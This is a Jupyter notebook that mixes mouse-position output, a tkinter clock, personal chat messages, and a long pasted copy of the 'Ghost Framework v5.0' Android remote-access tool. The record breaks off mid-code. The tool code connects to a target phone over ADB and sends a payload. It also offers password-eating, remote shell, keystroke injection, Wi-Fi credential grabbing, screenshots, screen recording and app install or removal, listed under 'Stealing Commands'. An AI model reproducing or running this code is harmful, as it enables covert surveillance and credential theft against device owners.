25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  902 Y:  563 RGB: (255, 255, 25X:  910 Y:  541 RGB: (255, 255, 25X:  929 Y:  491 RGB: (255, 255, 25X:  930 Y:  470 RGB: (255, 255, 25X:  930 Y:  462 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (  0,   0,   X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: ( 82, 166, 23X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: ( 82,   0,   X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  929 Y:  458 RGB: (255, 255, 25X:  933 Y:  398 RGB: (247, 247, 24X:  934 Y:  349 RGB: (255, 255, 25X:  931 Y:  286 RGB: (255, 255, 25X:  926 Y:  253 RGB: (255, 255, 25X:  921 Y:  217 RGB: (255, 255, 25X:  918 Y:  206 RGB: (255, 255, 25X:  918 Y:  202 RGB: (255, 255, 25X:  916 Y:  202 RGB: (255, 255, 25X:  910 Y:  202 RGB: (255, 255, 25X:  875 Y:  217 RGB: (230, 230, 23X:  837 Y:  224 RGB: (255, 255, 25X:  802 Y:  225 RGB: (255, 255, 25X:  779 Y:  219 RGB: (255, 255, 25X:  759 Y:  214 RGB: (255, 255, 25X:  749 Y:  214 RGB: (255, 255, 25X:  745 Y:  216 RGB: (255, 255, 25X:  742 Y:  216 RGB: (255, 255, 25X:  739 Y:  215 RGB: (255, 255, 25X:  728 Y:  211 RGB: (255, 255, 25X:  719 Y:  206 RGB: (211, 155,  8X:  706 Y:  205 RGB: (255, 255, 25X:  697 Y:  205 RGB: (230, 230, 23X:  691 Y:  205 RGB: ( 51,  51,  5X:  687 Y:  208 RGB: (230, 230, 23X:  681 Y:  213 RGB: (230, 227, 23X:  676 Y:  217 RGB: (230, 230, 23X:  672 Y:  218 RGB: (230, 230, 23X:  664 Y:  215 RGB: (230, 230, 23X:  654 Y:  212 RGB: ( 51,  51,  6X:  642 Y:  210 RGB: (230, 230, 23X:  635 Y:  208 RGB: (173, 173, 17X:  630 Y:  207 RGB: (230, 230, 23X:  629 Y:  204 RGB: (230, 230, 23X:  627 Y:  204 RGB: (230, 230, 23X:  626 Y:  204 RGB: (230, 230, 23X:  626 Y:  204 RGB: (230, 230, 23X:  625 Y:  203 RGB: (230, 230, 23X:  624 Y:  202 RGB: ( 51, 133, 19X:  624 Y:  202 RGB: ( 51, 133, 19X:  624 Y:  202 RGB: ( 51, 133, 19X:  624 Y:  202 RGB: ( 51, 133, 19X:  624 Y:  202 RGB: ( 51, 133, 19X:  624 Y:  202 RGB: ( 51, 133, 19X:  624 Y:  202 RGB: ( 51, 133, 19X:  624 Y:  202 RGB: ( 51, 133, 19X:  624 Y:  202 RGB: ( 51, 133, 19X:  624 Y:  202 RGB: ( 51, 133, 19X:  624 Y:  202 RGB: ( 51, 133, 19X:  624 Y:  202 RGB: ( 51, 133, 19X:  624 Y:  202 RGB: ( 51, 133, 19X:  624 Y:  202 RGB: ( 51, 133, 19X:  624 Y:  202 RGB: ( 51, 133, 19X:  624 Y:  202 RGB: ( 51, 133, 19X:  624 Y:  202 RGB: ( 51, 133, 19X:  624 Y:  202 RGB: ( 51, 133, 19X:  624 Y:  202 RGB: ( 51, 125, 17X:  624 Y:  202 RGB: ( 51, 125, 17X:  624 Y:  202 RGB: ( 51, 125, 17X:  624 Y:  202 RGB: ( 51, 125, 17X:  624 Y:  202 RGB: ( 51, 125, 17X:  624 Y:  202 RGB: ( 51, 125, 17\n"
     ]
    }
   ],
   "source": [
    "py.displayMousePosition()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [],
   "source": [
    "import tkinter as tk\n",
    "import time\n",
    "\n",
    "from tkinter import font\n",
    "\n",
    "root = tk.Tk()\n",
    "\n",
    "height = 800\n",
    "width = 800\n",
    "\n",
    "canvas = tk.Canvas(root,height = height,width = width,bg = 'blue')\n",
    "canvas.pack()\n",
    "\n",
    "def times():\n",
    "    string = time.strftime(\"%H:%M:%S %p\")\n",
    "    label.config(text = string)\n",
    "    label.after(1000,times)\n",
    "\n",
    "\n",
    "label = tk.Label(canvas,bg = 'blue',fg = 'black',font = ('Gabriola',20))\n",
    "label.place(relx = .7,rely= .05,relheight = .05,relwidth = .4)\n",
    "times()\n",
    "\n",
    "\n",
    "root.mainloop()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Point(x=10, y=10)"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "py.position(10,10)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"I tried so much and got so close but in the end i it doesn't even matter\""
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"I tried so much and got so close but in the end i it doesn't even matter\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"She's like all I need is your love and I said I don't feel like that and your are friend of Sahu so I never ever see you in such way and I know u form class 5\""
      ]
     },
     "execution_count": 57,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"She's like all I need is your love and I said I don't feel like that and your are friend of Sahu so I never ever see you in such way and I know u form class 5\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"Then she's not listening and I finally said I like someone else and she kept me asking who's that and I don't know what to say cause the person I like has no opinion of such kind over me\""
      ]
     },
     "execution_count": 58,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"Then she's not listening and I finally said I like someone else and she kept me asking who's that and I don't know what to say cause the person I like has no opinion of such kind over me\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"And also I believe she's right cause I just expressed my feelings and she has the same right \""
      ]
     },
     "execution_count": 59,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"And also I believe she's right cause I just expressed my feelings and she has the same right \""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'SO no prblm that side but I really miss her even now..:('"
      ]
     },
     "execution_count": 60,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"SO no prblm that side but I really miss her even now..:(\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'NO not there again wt else how abt you '"
      ]
     },
     "execution_count": 61,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"NO not there again wt else how abt you \""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Hws Charlie?? btw'"
      ]
     },
     "execution_count": 62,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"Hws Charlie?? btw\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Your country is center for corona now wtf is 1million cases'"
      ]
     },
     "execution_count": 63,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"Your country is center for corona now wtf is 1million cases\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'We are 45-50 thousand'"
      ]
     },
     "execution_count": 64,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"We are 45-50 thousand\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Cool TC bye '"
      ]
     },
     "execution_count": 65,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"Cool TC bye \""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[1;31m[-] \u001b[0mFailed to start Ghost Server!\n"
     ]
    },
    {
     "ename": "SystemExit",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "An exception has occurred, use %tb to see the full traceback.\n",
      "\u001b[1;31mSystemExit\u001b[0m\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\H\\anaconda3\\lib\\site-packages\\IPython\\core\\interactiveshell.py:3339: UserWarning: To exit: use 'exit', 'quit', or Ctrl-D.\n",
      "  warn(\"To exit: use 'exit', 'quit', or Ctrl-D.\", stacklevel=1)\n"
     ]
    }
   ],
   "source": [
    "\n",
    "\n",
    "\n",
    "import os\n",
    "\n",
    "os.system(\"printf '\\033]2;Ghost Framework\\a'\")\n",
    "\n",
    "import sys\n",
    "import subprocess\n",
    "import readline\n",
    "import time\n",
    "\n",
    "Q = '\\033[1;77m[?] \\033[0m'\n",
    "G = '\\033[1;34m[*] \\033[0m'\n",
    "S = '\\033[1;32m[+] \\033[0m'\n",
    "W = '\\033[1;33m[!] \\033[0m'\n",
    "E = '\\033[1;31m[-] \\033[0m'\n",
    "\n",
    "readline.parse_and_bind(\"tab: complete\")\n",
    "\n",
    "def start_server():\n",
    "    adb = os.popen(\"which adb\").read()\n",
    "    if adb.strip(\"\\n\") == \"\":\n",
    "        print(E+\"Failed to start Ghost Server!\")\n",
    "        sys.exit()\n",
    "    else:\n",
    "        os.system(\"chmod +x core/server.sh && core/server.sh stop\")\n",
    "        os.system(\"chmod +x core/server.sh && core/server.sh start\")\n",
    "\n",
    "def banner():\n",
    "    os.system(\"clear\")\n",
    "    os.system(\"cat banner/banner.txt\")\n",
    "    print(\"\")\n",
    "    print(\"Ghost Framework v5.0\")\n",
    "    print(\"--------------------\")\n",
    "    print(\"\")\n",
    "\n",
    "def main():\n",
    "    ui = input('\\033[4mghost\\033[0m> ').strip(\" \")\n",
    "    ui = ui.split()\n",
    "    while True:\n",
    "        if ui == []:\n",
    "            pass\n",
    "        elif ui[0] == \"exit\":\n",
    "            os.system(\"chmod +x core/server.sh && core/server.sh stop\")\n",
    "            sys.exit()\n",
    "        elif ui[0] == \"disconnect\":\n",
    "            print(E+\"Not connected to target device!\")\n",
    "        elif ui[0] == \"clear\":\n",
    "            os.system(\"clear\")\n",
    "        elif ui[0] == \"update\":\n",
    "            os.system(\"chmod +x etc/update.sh && etc/update.sh\")\n",
    "        elif ui[0] == \"help\":\n",
    "            print(\"\")\n",
    "            print(\"Core Commands\")\n",
    "            print(\"=============\")\n",
    "            os.system(\"cat data/cmds/core_cmds.txt\")\n",
    "            print(\"\")\n",
    "        elif ui[0] == \"connect\":\n",
    "            if len(ui) < 2:\n",
    "                print(\"Usage: connect <device>\")\n",
    "            else:\n",
    "                target = ui[1].split(':')[0]\n",
    "                print(G+\"Connecting to \"+target+\"...\")\n",
    "                os.system(\"chmod +x core/dctl.sh && core/dctl.sh connect \"+target)\n",
    "                is_connected = os.popen(\"adb devices | grep \"+target).read()\n",
    "                is_offline = os.popen(\"adb devices | grep offline\").read()\n",
    "                if is_connected == \"\":\n",
    "                    print(E+\"Failed to connect to \"+target+\"!\")\n",
    "                    os.system(\"chmod +x core/dctl.sh && core/dctl.sh disconnect \"+target)\n",
    "                    main()  \n",
    "                else:\n",
    "                    if is_offline == \"\":\n",
    "                        pass\n",
    "                    else:\n",
    "                        print(E+\"Failed to connect to \"+target+\"!\")\n",
    "                        os.system(\"chmod +x core/dctl.sh && core/dctl.sh disconnect \"+target)\n",
    "                        main()\n",
    "                time.sleep(0.5)\n",
    "                print(G+\"Sending payload to \"+target+\"...\")\n",
    "                time.sleep(1)\n",
    "                device = target\n",
    "                con = input('\\033[4mghost\\033[0m(\\033[1;31m'+device+'\\033[0m)> ').strip(\" \")\n",
    "                con = con.split()\n",
    "                while True:\n",
    "                    if con == []:\n",
    "                        pass\n",
    "                    elif con[0] == \"exit\":\n",
    "                        os.system(\"chmod +x core/server.sh && core/server.sh stop\")\n",
    "                        sys.exit()\n",
    "                    elif con[0] == \"disconnect\":\n",
    "                        os.system(\"chmod +x core/dctl.sh && core/dctl.sh disconnect \"+target)\n",
    "                        break\n",
    "                    elif con[0] == \"clear\":\n",
    "                        os.system(\"clear\")\n",
    "                    elif con[0] == \"update\":\n",
    "                        os.system(\"chmod +x etc/update.sh && etc/update.sh\")\n",
    "                    elif con[0] == \"help\":\n",
    "                        print(\"\")\n",
    "                        print(\"Core Commands\")\n",
    "                        print(\"=============\")\n",
    "                        os.system(\"cat data/cmds/core_cmds.txt\")\n",
    "                        print(\"\")\n",
    "                        print(\"Settings Commands\")\n",
    "                        print(\"=================\")\n",
    "                        os.system(\"cat data/cmds/settings_cmds.txt\")\n",
    "                        print(\"\")\n",
    "                        print(\"Managing Commands\")\n",
    "                        print(\"=================\")\n",
    "                        os.system(\"cat data/cmds/managing_cmds.txt\")\n",
    "                        print(\"\")\n",
    "                        print(\"Stealing Commands\")\n",
    "                        print(\"=================\")\n",
    "                        os.system(\"cat data/cmds/stealing_cmds.txt\")\n",
    "                        print(\"\")\n",
    "                        print(\"Boot Commands\")\n",
    "                        print(\"=============\")\n",
    "                        os.system(\"cat data/cmds/boot_cmds.txt\")\n",
    "                        print(\"\")\n",
    "                    elif con[0] == \"connect\":\n",
    "                        print(W+\"Already connected to \"+device+\".\")\n",
    "                    elif con[0] == \"eatpass\":\n",
    "                        os.system(\"chmod +x data/payloads/eatpass && data/payloads/eatpass\")\n",
    "                    elif con[0] == \"shell\":\n",
    "                        os.system(\"chmod +x data/payloads/shell && data/payloads/shell\")\n",
    "                    elif con[0] == \"reboot\":\n",
    "                        os.system(\"chmod +x data/payloads/reboot && data/payloads/reboot\")\n",
    "                    elif con[0] == \"bootl\":\n",
    "                        os.system(\"chmod +x data/payloads/bootl && data/payloads/bootl\")\n",
    "                    elif con[0] == \"recovery\":\n",
    "                        os.system(\"chmod +x data/payloads/recovery && data/payloads/recovery\")\n",
    "                    elif con[0] == \"keyboard\":\n",
    "                        print(\"Press Ctrl-C to stop.\")\n",
    "                        print(\"Device keyboard:\")\n",
    "                        try:\n",
    "                            while True:\n",
    "                                text = input()\n",
    "                                text = text.replace(\" \", \"%s\")\n",
    "                                os.system(\"chmod +x data/keyboard/keyboard.sh \"+text)\n",
    "                        except:\n",
    "                            print(\"\")\n",
    "                    elif con[0] == \"keycodes\":\n",
    "                        os.system(\"cat data/keycode/keycodes.txt\")\n",
    "                    elif con[0] == \"keycode\":\n",
    "                        if len(con) < 2:\n",
    "                            print(\"Usage: keycode <keycode_number>\")\n",
    "                        else:\n",
    "                            nums = open(\"substrate/keynums.txt\").read()\n",
    "                            task = 0\n",
    "                            for i in nums:\n",
    "                                if con[1] == i:\n",
    "                                    task = 1\n",
    "                            if task == 1:\n",
    "                                os.system(\"chmod +x data/kaycode/keycode.sh && data/keycode/keycode.sh \"+con[1])\n",
    "                            else:\n",
    "                                print(E+\"Keycode is not found!\")\n",
    "                    elif con[0] == \"battery\":\n",
    "                        os.system(\"chmod +x data/payloads/battery && data/payloads/battery\")\n",
    "                    elif con[0] == \"activity\":\n",
    "                        os.system(\"chmod +x data/payloads/activity && data/payloads/activity\")\n",
    "                    elif con[0] == \"netstat\":\n",
    "                        os.system(\"chmod +x data/payloads/netstat && data/payloads/netstat\")\n",
    "                    elif con[0] == \"debug\":\n",
    "                        os.system(\"chmod +x data/payloads/debug && data/payloads/debug\")\n",
    "                    elif con[0] == \"sysinfo\":\n",
    "                        os.system(\"chmod +x data/payloads/sysinfo && data/payloads/sysinfo\")\n",
    "                    elif con[0] == \"inet\":\n",
    "                        os.system(\"chmod +x data/payloads/inet && data/payloads/inet\")\n",
    "                    elif con[0] == \"wifi\":\n",
    "                        if con[1] == \"on\":\n",
    "                            os.system(\"chmod +x data/payloads/wifi && data/payloads/wifi on\")\n",
    "                        elif con[1] == \"off\":\n",
    "                            os.system(\"chmod +x data/payloads/wifi && data/payloads/wifi off\")\n",
    "                        else:\n",
    "                            print(\"Usage: wifi [on|off]\")\n",
    "                    elif con[0] == \"wgrabber\":\n",
    "                        if len(con) < 2:\n",
    "                            print(\"Usage: wgrabber <local_path>\")\n",
    "                        else:\n",
    "                            if os.path.isdir(con[1]):\n",
    "                                if os.path.exists(con[1]):\n",
    "                                    rp = os.path.split(con[1])[1]\n",
    "                                    chk = os.popen(\"chmod +x data/check/rcheck.sh && data/check/rcheck.sh\").read()\n",
    "                                    if chk == \"0\\n\":\n",
    "                                        print(G+\"Grabbing WPA Supplicant...\")\n",
    "                                        os.system(\"chmod +x data/grabber/grabber.sh && data/grabber/grabber.sh -w \"+con[1]+\"/wpa_supplicant.conf\")\n",
    "                                        if con[1][-1] == \"/\":\n",
    "                                            print(G+\"Saving to \"+con[1]+\"wpa_supplicant.conf...\")\n",
    "                                            time.sleep(1)\n",
    "                                            print(S+\"Saved to \"+con[1]+\"wpa_supplicant.conf!\")\n",
    "                                        else:\n",
    "                                            print(G+\"Saving to \"+con[1]+\"/wpa_supplicant.conf...\")\n",
    "                                            time.sleep(1)\n",
    "                                            print(S+\"Saved to \"+con[1]+\"/wpa_supplicant.conf!\")\n",
    "                                    else:\n",
    "                                        print(E+\"Target device is not rooted!\")\n",
    "                                else:\n",
    "                                    print(E+\"Local directory: \"+con[1]+\": does not exist!\")\n",
    "                            else:\n",
    "                                rp = os.path.split(con[1])[0]\n",
    "                                if rp == \"\":\n",
    "                                    rp = \".\"\n",
    "                                else:\n",
    "                                    pass\n",
    "                                if os.path.exists(rp):\n",
    "                                    if os.path.isdir(rp):\n",
    "                                        rp = os.path.split(con[1])[1]\n",
    "                                        chk = os.popen(\"chmod +x data/check/rcheck.sh && data/check/rcheck.sh\").read()\n",
    "                                        if chk == \"0\\n\":\n",
    "                                            print(G+\"Grabbing wpa_supplicant...\")\n",
    "                                            os.system(\"chmod +x data/grabber/grabber.sh && data/grabber/grabber.sh -w \"+con[1])\n",
    "                                            print(G+\"Saving to \"+con[1]+\"...\")\n",
    "                                            time.sleep(1)\n",
    "                                            print(S+\"Saved to \"+con[1]+\"!\")\n",
    "                                        else:\n",
    "                                            print(E+\"Target device is not rooted!\")\n",
    "                                    else:\n",
    "                                        print(E+\"Error: \"+rp+\": not a directory!\")\n",
    "                                else:\n",
    "                                    print(E+\"Local directory: \"+rp+\": does not exist!\")\n",
    "                    elif con[0] == \"screenshot\":\n",
    "                        if len(con) < 2:\n",
    "                            print(\"Usage: screenshot <local_path>\")\n",
    "                        else:\n",
    "                            if os.path.isdir(con[1]):\n",
    "                                if os.path.exists(con[1]):\n",
    "                                    print(G+\"Taking screenshot...\")\n",
    "                                    os.system(\"chmod +x data/grabber/grabber.sh && data/grabber/grabber.sh -s \"+con[1]+\"/screen.png\")\n",
    "                                    if con[1][-1] == \"/\":\n",
    "                                        print(G+\"Saving to \"+con[1]+\"screen.png...\")\n",
    "                                        time.sleep(1)\n",
    "                                        print(S+\"Saved to \"+con[1]+\"screen.png!\")\n",
    "                                    else:\n",
    "                                        print(G+\"Saving to \"+con[1]+\"/screen.png...\")\n",
    "                                        time.sleep(1)\n",
    "                                        print(S+\"Saved to \"+con[1]+\"/screen.png!\")\n",
    "                                else:\n",
    "                                    print(E+\"Local directory: \"+con[1]+\": does not exist!\")\n",
    "                            else:\n",
    "                                rp = os.path.split(con[1])[0]\n",
    "                                if rp == \"\":\n",
    "                                    rp = \".\"\n",
    "                                else:\n",
    "                                    pass\n",
    "                                if os.path.exists(rp):\n",
    "                                    if os.path.isdir(rp):\n",
    "                                        rp = os.path.split(con[1])[1]\n",
    "                                        print(G+\"Taking screenshot...\")\n",
    "                                        os.system(\"chmod +x data/grabber/grabber.sh && data/grabber/grabber.sh -s \"+con[1])\n",
    "                                        print(G+\"Saving to \"+con[1]+\"...\")\n",
    "                                        time.sleep(1)\n",
    "                                        print(S+\"Saved to \"+con[1]+\"!\")\n",
    "                                    else:\n",
    "                                        print(E+\"Error: \"+rp+\": not a directory!\")\n",
    "                                else:\n",
    "                                    print(E+\"Local directory: \"+rp+\": does not exist!\")\n",
    "                    elif con[0] == \"screenrec\":\n",
    "                        if len(con) < 2:\n",
    "                            print(\"Usage: screenrec <local_path>\")\n",
    "                        else:\n",
    "                            if os.path.isdir(con[1]):\n",
    "                                if os.path.exists(con[1]):\n",
    "                                    print(G+\"Recording screen...\")\n",
    "                                    print(G+\"Press Ctrl-C to stop.\")\n",
    "                                    os.system(\"chmod +x data/grabber/grabber.sh && data/grabber/grabber.sh -r \"+con[1]+\"/screen.mp4\")\n",
    "                                    if con[1][-1] == \"/\":\n",
    "                                        print(G+\"Saving to \"+con[1]+\"screen.mp4...\")\n",
    "                                        time.sleep(1)\n",
    "                                        print(S+\"Saved to \"+con[1]+\"screen.mp4!\")\n",
    "                                    else:\n",
    "                                        print(G+\"Saving to \"+con[1]+\"/screen.mp4...\")\n",
    "                                        time.sleep(1)\n",
    "                                        print(S+\"Saved to \"+con[1]+\"/screen.mp4!\")\n",
    "                                else:\n",
    "                                    print(E+\"Local directory: \"+con[1]+\": does not exist!\")\n",
    "                            else:\n",
    "                                rp = os.path.split(con[1])[0]\n",
    "                                if rp == \"\":\n",
    "                                    rp = \".\"\n",
    "                                else:\n",
    "                                    pass\n",
    "                                if os.path.exists(rp):\n",
    "                                    if os.path.isdir(rp):\n",
    "                                        rp = os.path.split(con[1])[1]\n",
    "                                        print(G+\"Recording screen...\")\n",
    "                                        print(G+\"Press Ctrl-C to stop.\")\n",
    "                                        os.system(\"chmod +x data/grabber/grabber.sh && data/grabber/grabber.sh -r \"+con[1])\n",
    "                                        print(G+\"Saving to \"+con[1]+\"...\")\n",
    "                                        time.sleep(1)\n",
    "                                        print(S+\"Saved to \"+con[1]+\"!\")\n",
    "                                    else:\n",
    "                                        print(E+\"Error: \"+rp+\": not a directory!\")\n",
    "                                else:\n",
    "                                    print(E+\"Local directory: \"+rp+\": does not exist!\")\n",
    "                    elif con[0] == \"uninstall\":\n",
    "                        if len(con) < 2:\n",
    "                            print(\"Usage: uninstall <application>\")\n",
    "                        else:\n",
    "                            apps = os.popen(\"adb shell pm list packages -f | grep package:\").read()\n",
    "                            cache = apps.split(\"\\n\")\n",
    "                            apps = [i[i.index(\"=\")+1:] for i in cache if \"=\" in i]\n",
    "                            turn = 0\n",
    "                            for i in apps:\n",
    "                                if con[1] == i:\n",
    "                                    turn = 1\n",
    "                            if turn == 1:\n",
    "                                print(G+\"Uninstalling \"+con[1]+\"...\")\n",
    "                                os.system(\"chmod +x core/apps/uninstall.sh && core/apps/uninstall.sh \"+con[1])\n",
    "                                print(S+\"Successfully uninstalled!\")\n",
    "                            else:\n",
    "                                print(E+\"Application is not found!\")\n",
    "                    elif con[0] == \"launch\":\n",
    "                        if len(con) < 2:\n",
    "                            print(\"Usage: launch <application>\")\n",
    "                        else:\n",
    "                            apps = os.popen(\"adb shell pm list packages -f | grep package:\").read()\n",
    "                            cache = apps.split(\"\\n\")\n",
    "                            apps = [i[i.index(\"=\")+1:] for i in cache if \"=\" in i]\n",
    "                            turn = 0\n",
    "                            for i in apps:\n",
    "                                if con[1] == i:\n",
    "                                    turn = 1\n",
    "                            if turn == 1:\n",
    "                                os.system(\"chmod +x core/apps/launch.sh && core/apps/launch.sh \"+con[1])\n",
    "                            else:\n",
    "                                print(E+\"Application is not found!\")\n",
    "                    elif con[0] == \"apps\":\n",
    "                        apps = os.popen(\"adb shell pm list packages -f | grep package:\").read()\n",
    "                        cache = apps.split(\"\\n\")\n",
    "                        apps = [i[i.index(\"=\")+1:] for i in cache if \"=\" in i]\n",
    "                        for i in apps:\n",
    "                            print(i)\n",
    "                    elif con[0] == \"install\":\n",
    "                        if len(con) < 2:\n",
    "                            print(\"Usage: install <local_path>\")\n",
    "                        else:\n",
    "                            if os.path.exists(con[1]):\n",
    "                                ext = os.path.splitext(con[1])\n",
    "                                if os.path.isdir(con[1]):\n",
    "                                    print(E+\"Error: \"+con[1]+\": not a file!\")\n",
    "                                else:\n",
    "                                    if ext[1] == \".apk\":\n",
    "                                        print(G+\"Installing \"+con[1]+\"...\")\n",
    "                                        os.system(\"chmod +x core/apps/install.sh && core/apps/install.sh \"+con[1])\n",
    "                                        print(S+\"Succcessfully installed!\")\n",
    "                                    else:\n",
    "                                        print(E+\"Local file: \"+con[1]+\": not an apk file!\")\n",
    "                            else:\n",
    "                                print(E+\"Local file: \"+con[1]+\": does not exist!\")\n",
    "                    elif con[0] == \"download\":\n",
    "                        if len(con) < 3:\n",
